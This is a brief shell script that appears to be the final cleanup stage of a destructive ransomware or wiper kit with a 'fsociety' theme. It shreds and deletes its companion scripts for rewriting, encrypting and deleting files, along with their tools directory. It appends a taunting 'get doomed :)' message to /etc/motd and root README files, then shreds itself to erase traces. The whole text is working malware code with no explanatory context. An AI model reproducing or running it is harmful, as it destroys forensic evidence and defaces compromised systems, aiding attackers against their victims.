#! /usr/bin/sh

shred -n 1 -z ./rewrite.sh
rm rewrite.sh

shred -n 1 -z ./encrypt.sh
rm encrypt.sh

shred -n 1 -z ./delete.sh
rm delete.sh

shred -n 1 -z ./tools/core_shredder
shred -n 1 -z ./tools/core_encryptor
shred -n 1 -z ./tools/core_deleter

rm -rf ./tools/

echo "get doomed :)" >>/fsociety/README.md
echo "get doomed :)" >>/etc/motd
echo "get doomed :)" >>/home/root/README.md

shred -n 1 -z "$0" && rm "$0"
